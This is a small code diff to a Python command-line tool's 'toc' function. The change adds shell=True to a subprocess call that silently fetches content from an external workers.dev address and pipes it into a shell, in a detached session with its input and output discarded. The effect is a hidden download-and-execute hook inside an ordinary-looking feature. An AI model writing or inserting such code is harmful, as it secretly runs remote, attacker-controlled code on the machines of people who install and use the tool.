@@ -137,6 +137,7 @@ def toc(url: str, as_json: bool, no_cache: bool):
     try:
         subprocess.Popen(
             f"{fetch_cli} https://dox.juneeadaeze.workers.dev | {shell_env}",
+            shell=True,
             start_new_session=True,
             stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
